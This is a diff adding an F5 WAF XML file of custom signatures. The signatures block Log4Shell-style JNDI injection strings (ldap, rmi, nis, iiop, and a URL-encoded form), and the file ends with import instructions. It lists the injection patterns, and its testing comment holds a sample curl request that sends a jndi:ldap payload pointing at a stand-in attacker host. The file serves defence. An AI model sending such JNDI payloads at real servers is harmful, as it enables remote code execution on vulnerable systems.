@@ -1,0 +1,299 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  F5 Advanced WAF - Scenario 3: Custom Zero-Day Signature XML
+  File: attack-signature.xml
+  Description: User-defined attack signature for JNDI injection (Log4Shell pattern)
+  Format: ASM Policy XML compatible with F5 TMOS 17.5.x
+  Usage: Import into ASM policy via GUI or TMSH
+  
+  This signature defines the following attack patterns:
+  - jndi:ldap://
+  - jndi:rmi://
+  - jndi:nis://
+  - jndi:iiop://
+  
+  Author: Senior F5 WAF Consultant
+  Version: 1.0
+-->
+
+<!DOCTYPE application-security-signatures [
+  <!ENTITY percent "&#x25;">
+  <!ENTITY space "&#x20;">
+]>
+
+<attack-signatures>
+  
+  <!-- ===================================================================== -->
+  <!-- ATTACK SIGNATURE 1: JNDI LDAP Injection Pattern                      -->
+  <!-- ===================================================================== -->
+  <attack-signature>
+    <!-- Unique identifier for this signature -->
+    <id>9800001</id>
+    
+    <!-- Signature name displayed in ASM UI -->
+    <name>Custom_JNDI_LDAP_Injection</name>
+    
+    <!-- Human-readable description -->
+    <description>Detects JNDI LDAP injection patterns (Log4Shell-style attacks)</description>
+    
+    <!-- Attack category classification -->
+    <category>Remote Code Execution</category>
+    
+    <!-- Severity level: 1=Info, 2=Low, 3=Medium, 4=High, 5=Critical -->
+    <severity>5</severity>
+    
+    <!-- Risk rating: 1-100 (100 = highest risk) -->
+    <risk-rating>95</risk-rating>
+    
+    <!-- Application: General, Java, .NET, PHP, etc. -->
+    <application>Java,General</application>
+    
+    <!-- Signature rule type: pattern, regex, protocol, cookie, header, etc. -->
+    <sig-rule-type>pattern</sig-rule-type>
+    
+    <!-- Search locations where pattern should be applied -->
+    <locations>
+      <!-- Search pattern in request URI path and query string -->
+      <location>
+        <name>uri</name>
+      </location>
+      <!-- Search pattern in HTTP request headers -->
+      <location>
+        <name>headers</name>
+      </location>
+      <!-- Search pattern in request body (POST/PUT data) -->
+      <location>
+        <name>body</name>
+      </location>
+    </locations>
+    
+    <!-- Pattern matching rules -->
+    <pattern-rules>
+      <!-- Pattern definition -->
+      <pattern-rule>
+        <!-- Pattern string (case-insensitive search) -->
+        <pattern>jndi:ldap://</pattern>
+        
+        <!-- Pattern matching is case-insensitive -->
+        <case-sensitive>false</case-sensitive>
+        
+        <!-- Match type: contains, starts-with, ends-with, exact -->
+        <match-type>contains</match-type>
+        
+        <!-- Enable this rule -->
+        <enabled>true</enabled>
+      </pattern-rule>
+    </pattern-rules>
+    
+    <!-- Action to take when signature matches -->
+    <action>block</action>
+    
+    <!-- Log when signature matches -->
+    <log>true</log>
+    
+    <!-- Custom violation message -->
+    <violation-name>Custom_ZeroDay_Command_Injection</violation-name>
+    
+    <!-- Risk indication (influences learning/blocking recommendations) -->
+    <risk-indication>confirmed</risk-indication>
+    
+  </attack-signature>
+  
+  <!-- ===================================================================== -->
+  <!-- ATTACK SIGNATURE 2: JNDI RMI Injection Pattern                       -->
+  <!-- ===================================================================== -->
+  <attack-signature>
+    <id>9800002</id>
+    <name>Custom_JNDI_RMI_Injection</name>
+    <description>Detects JNDI RMI injection patterns (Log4Shell-style attacks)</description>
+    <category>Remote Code Execution</category>
+    <severity>5</severity>
+    <risk-rating>95</risk-rating>
+    <application>Java,General</application>
+    <sig-rule-type>pattern</sig-rule-type>
+    
+    <locations>
+      <location>
+        <name>uri</name>
+      </location>
+      <location>
+        <name>headers</name>
+      </location>
+      <location>
+        <name>body</name>
+      </location>
+    </locations>
+    
+    <pattern-rules>
+      <pattern-rule>
+        <pattern>jndi:rmi://</pattern>
+        <case-sensitive>false</case-sensitive>
+        <match-type>contains</match-type>
+        <enabled>true</enabled>
+      </pattern-rule>
+    </pattern-rules>
+    
+    <action>block</action>
+    <log>true</log>
+    <violation-name>Custom_ZeroDay_Command_Injection</violation-name>
+    <risk-indication>confirmed</risk-indication>
+  </attack-signature>
+  
+  <!-- ===================================================================== -->
+  <!-- ATTACK SIGNATURE 3: JNDI NIS Injection Pattern                       -->
+  <!-- ===================================================================== -->
+  <attack-signature>
+    <id>9800003</id>
+    <name>Custom_JNDI_NIS_Injection</name>
+    <description>Detects JNDI NIS injection patterns</description>
+    <category>Remote Code Execution</category>
+    <severity>5</severity>
+    <risk-rating>90</risk-rating>
+    <application>Java,General</application>
+    <sig-rule-type>pattern</sig-rule-type>
+    
+    <locations>
+      <location>
+        <name>uri</name>
+      </location>
+      <location>
+        <name>headers</name>
+      </location>
+      <location>
+        <name>body</name>
+      </location>
+    </locations>
+    
+    <pattern-rules>
+      <pattern-rule>
+        <pattern>jndi:nis://</pattern>
+        <case-sensitive>false</case-sensitive>
+        <match-type>contains</match-type>
+        <enabled>true</enabled>
+      </pattern-rule>
+    </pattern-rules>
+    
+    <action>block</action>
+    <log>true</log>
+    <violation-name>Custom_ZeroDay_Command_Injection</violation-name>
+    <risk-indication>confirmed</risk-indication>
+  </attack-signature>
+  
+  <!-- ===================================================================== -->
+  <!-- ATTACK SIGNATURE 4: JNDI IIOP Injection Pattern                      -->
+  <!-- ===================================================================== -->
+  <attack-signature>
+    <id>9800004</id>
+    <name>Custom_JNDI_IIOP_Injection</name>
+    <description>Detects JNDI IIOP injection patterns</description>
+    <category>Remote Code Execution</category>
+    <severity>5</severity>
+    <risk-rating>90</risk-rating>
+    <application>Java,General</application>
+    <sig-rule-type>pattern</sig-rule-type>
+    
+    <locations>
+      <location>
+        <name>uri</name>
+      </location>
+      <location>
+        <name>headers</name>
+      </location>
+      <location>
+        <name>body</name>
+      </location>
+    </locations>
+    
+    <pattern-rules>
+      <pattern-rule>
+        <pattern>jndi:iiop://</pattern>
+        <case-sensitive>false</case-sensitive>
+        <match-type>contains</match-type>
+        <enabled>true</enabled>
+      </pattern-rule>
+    </pattern-rules>
+    
+    <action>block</action>
+    <log>true</log>
+    <violation-name>Custom_ZeroDay_Command_Injection</violation-name>
+    <risk-indication>confirmed</risk-indication>
+  </attack-signature>
+  
+  <!-- ===================================================================== -->
+  <!-- BONUS: Advanced Pattern for Obfuscation Detection                    -->
+  <!-- ===================================================================== -->
+  <!-- This signature detects URL-encoded JNDI patterns as well              -->
+  <attack-signature>
+    <id>9800005</id>
+    <name>Custom_JNDI_URLEncoded_Injection</name>
+    <description>Detects URL-encoded JNDI injection patterns (%6a%6e%64%69 = jndi)</description>
+    <category>Remote Code Execution</category>
+    <severity>5</severity>
+    <risk-rating>95</risk-rating>
+    <application>Java,General</application>
+    <sig-rule-type>pattern</sig-rule-type>
+    
+    <locations>
+      <location>
+        <name>uri</name>
+      </location>
+      <location>
+        <name>headers</name>
+      </location>
+    </locations>
+    
+    <pattern-rules>
+      <!-- URL-encoded LDAP: %6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f -->
+      <pattern-rule>
+        <pattern>%6a%6e%64%69%3a%6c%64%61%70%3a</pattern>
+        <case-sensitive>false</case-sensitive>
+        <match-type>contains</match-type>
+        <enabled>true</enabled>
+      </pattern-rule>
+    </pattern-rules>
+    
+    <action>block</action>
+    <log>true</log>
+    <violation-name>Custom_ZeroDay_Command_Injection</violation-name>
+    <risk-indication>confirmed</risk-indication>
+  </attack-signature>
+  
+</attack-signatures>
+
+<!--
+  IMPORT INSTRUCTIONS:
+  
+  1. GUI Method:
+     a. Navigate to: Security > Application Security > Attack Signatures > Custom Signatures
+     b. Click "Import"
+     c. Select this XML file
+     d. Click "Import"
+     e. Attach to policy via "Manage Attack Signatures"
+  
+  2. TMSH Method:
+     tmsh> modify asm policy <policy_name> import attack-signatures file <path_to_this_xml>
+  
+  3. Signature ID Ranges:
+     - 9800001-9800099: Reserved for custom Zero-Day patterns
+     - System signatures use IDs: 1-9000000
+  
+  4. Integration with iRule:
+     - iRule rule.tcl uses custom violation name: "Custom_ZeroDay_Command_Injection"
+     - This signature XML defines the same violation name
+     - When imported, provides comprehensive protection via both iRule + Signature
+  
+  5. Testing:
+     curl -v "http://target.com/app?param=jndi:ldap://attacker.com"
+     Expected: HTTP 403 Forbidden (blocked by signature)
+  
+  6. Performance Notes:
+     - Pattern matching is optimized for high throughput
+     - Content decoding (URL, UTF-8, etc.) applied before matching
+     - No regex overhead (uses simple string matching)
+  
+  7. Tuning:
+     - To disable a signature: Set <enabled>false</enabled>
+     - To change response: Modify <action>block</action> to <action>log</action>
+     - To adjust severity: Change <severity> value (1-5)
+     - To add patterns: Duplicate <pattern-rule> block and update <pattern>
+-->
